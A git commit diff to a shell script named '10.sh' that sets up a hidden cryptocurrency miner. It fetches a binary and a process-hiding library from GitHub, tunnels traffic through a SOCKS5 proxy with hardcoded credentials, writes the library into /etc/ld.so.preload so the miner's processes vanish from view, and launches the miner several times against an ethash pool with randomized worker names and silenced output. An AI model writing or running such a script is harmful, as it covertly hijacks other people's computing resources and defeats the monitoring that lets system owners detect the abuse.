ae2f097aab8857216161b77d068aa59e1e5cdea6
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-06-15 01:44:17 -0600

    Update 10.sh

--- 10.sh
+++ 10.sh
@@ -1,23 +1,19 @@
 #!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
 
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
 
-
-
-
-
-
-
-
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz >/dev/null 2>&1
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 154.37.174.9:5074
-socks5_username = lebarankita
-socks5_password = buatTHRan
+socks5 = p.webshare.io:80
+socks5_username = ubuntu2004-rotate
+socks5_password = LijayaAnli1188
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -39,32 +35,28 @@ echo ""
 echo " "
 echo " "
 
-curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && sudo apt install gcc && npm i -g node-process-hider >/dev/null 2>&1
-ph add graftcp
-ph add bezzHash
+./graftcp/graftcp wget https://raw.githubusercontent.com/Sarahaw77/idih/main/MagicBinn
+chmod +x MagicBinn
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash >/dev/null 2>&1
-chmod +x bezzHash
-
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip >/dev/null 2>&1
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX >/dev/null 2>&1
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX >/dev/null 2>&1
+./graftcp/graftcp ./MagicBinn --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX >/dev/null 2>&1
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX >/dev/null 2>&1
+./graftcp/graftcp ./MagicBinn --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX >/dev/null 2>&1
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX >/dev/null 2>&1
+./graftcp/graftcp ./MagicBinn --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX >/dev/null 2>&1
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX >/dev/null 2>&1
+./graftcp/graftcp ./MagicBinn --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX >/dev/null 2>&1
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX >/dev/null 2>&1
+./graftcp/graftcp ./MagicBinn --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX >/dev/null 2>&1
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX >/dev/null 2>&1
+./graftcp/graftcp ./MagicBinn --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX >/dev/null 2>&1
 
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX >/dev/null 2>&1
+./graftcp/graftcp ./MagicBinn --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX >/dev/null 2>&1
+
+./graftcp/graftcp ./MagicBinn --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX >/dev/null 2>&1
